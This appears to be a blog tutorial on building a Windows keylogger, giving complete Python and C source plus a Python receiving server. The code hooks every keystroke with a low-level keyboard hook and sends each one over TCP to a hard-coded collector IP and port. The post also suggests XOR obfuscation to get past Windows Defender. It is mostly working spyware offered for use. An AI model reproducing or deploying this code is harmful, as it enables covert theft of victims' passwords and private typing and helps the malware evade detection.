---
layout: post
category: tools
---
# creating the Keylogger

today i'll show you how to create a Keylogger for Windows x64. this is a simple version, so it's detected by Windows Defender. maybe you can use the [XOR post](https://notluken.github.io/hiding-your-payload-with-xor.html) to obfuscate it. 

in this version of the keylogger, the key comes in ASCII to the server. in a second version i'll make a decoder from ascii. 
## in Python

   ```python
import pyautogui  # For capturing key presses
import socket
from ctypes import windll, byref, Structure, c_ulong, c_long, CFUNCTYPE, POINTER
from ctypes.wintypes import DWORD, WPARAM, LPARAM, POINT, HHOOK, MSG

# Define the structure for the KBDLLHOOKSTRUCT -> it's a data structure which saves an event of the keyboard at low level. 
class KBDLLHOOKSTRUCT(Structure):
    _fields_ = [("vkCode", DWORD),
                ("scanCode", DWORD),
                ("flags", DWORD),
                ("time", DWORD),
                ("dwExtraInfo", DWORD)]

# Callback function type for the keyboard hook
KeyboardProc = CFUNCTYPE(c_ulong, WPARAM, LPARAM, POINTER(KBDLLHOOKSTRUCT))

# Callback function for the keyboard hook
def keyboard_hook(nCode, wParam, lParam):
    if nCode >= 0 and wParam == 256:  # WM_KEYDOWN
        # Extract the key code
        vkCode = lParam.contents.vkCode

        # Send the key code to the server
        send_key(vkCode)

    # Call the next hook in the chain
    return windll.user32.CallNextHookEx(None, nCode, wParam, lParam)

# Function to send the captured key to the server
def send_key(key):
    # Connect to the server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.100.146', 33456)) # CHANGE IP 

    try:
        # Convert the key code to bytes
        key_bytes = key.to_bytes(4, byteorder='little')

        # Send the key code to the server
        s.sendall(key_bytes)
    except Exception as e:
        print("Error occurred while sending key:", e)
    finally:
        # Close the socket
        s.close()

# Function to initialize the keyboard hook
def init_hook():
    # Convert the callback function to the correct type
    hook_proc = KeyboardProc(keyboard_hook)

    # Set up the keyboard hook
    hook = windll.user32.SetWindowsHookExA(
        13,  # WH_KEYBOARD_LL
        hook_proc,
        None,
        0
    )

    # Keep the hook active
    msg = MSG()
    while windll.user32.GetMessageA(byref(msg), 0, 0, 0) != 0:
        windll.user32.TranslateMessage(byref(msg))
        windll.user32.DispatchMessageA(byref(msg))

# Main function
if __name__ == '__main__':
    # Initialize the keyboard hook
    init_hook()

   ```

this script in python works. but in C, it has an error. you can send only 1 key before the program crashes. i'm studying why. if do you have any ideas contact me, my discord is `_notluken` 
## in C

```c
#include <windows.h>
#include <winuser.h>
#include <stdio.h>
#include <winsock2.h>
#include <time.h>

// Function prototypes
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
void SendKey(int key);
void InitSocket();
void CloseSocket();

// Global variables
SOCKET sock;

int main() {
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    if (hook == NULL) {
        printf("Failed to set hook\n");
        return 1;
    }

    InitSocket();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
    CloseSocket();
    return 0;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *kbStruct = (KBDLLHOOKSTRUCT*)lParam;
        int keyCode = kbStruct->vkCode;
        SendKey(keyCode);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void SendKey(int key) {
    if (send(sock, (char*)&key, sizeof(int), 0) < 0) {
        printf("Failed to send key\n");
    }
    // Add a short delay to allow the server to process the key
    Sleep(100); // Delay for 100 milliseconds (adjust as needed)
}

void InitSocket() {
    WSADATA wsa;
    struct sockaddr_in server;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("Failed to initialize Winsock\n");
        return;
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        printf("Failed to create socket\n");
        return;
    }

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("192.168.100.146"); /* CHANGE IP */
    server.sin_port = htons(33456);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        printf("Failed to connect\n");
        return;
    }
}

void CloseSocket() {
    closesocket(sock);
    WSACleanup();
}
```

# Server Side 
To receive data sent by your keylogger, you'll need to run this simple script that listens on port 33456 and receives incoming connections.

```python
#!/usr/bin/python3
import socket

# Create a new TCP/IP socket object
server_socket = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)

# Bind the server to an address and port number
server_socket.bind(('192.168.100.146', 33456)) # CHANGE IP TO SERVER IP 

# Listen for incoming connections
server_socket.listen(1)

print("[+] Server listening on port 33456... (Press Ctrl+C to stop the server)")

while True:
    try:
        # Accept a connection
        client_socket, addr = server_socket.accept()
       # print('Connected to', addr)

        # Receive data from the client
        received_data = client_socket.recv(1024)
       # print("Received data: ", received_data)

        # Interpret the received data (assuming it's bytes representing a key code)
        try:
            key_code = int.from_bytes(received_data, byteorder='little')
            print("Key code:", key_code)
        except ValueError as e:
            print("Error interpreting data:", e)

        # Close the connection
        client_socket.close()
    except KeyboardInterrupt:
        print("\n[+] Stopping the server...")
        break

# Stop the server
server_socket.close()
```

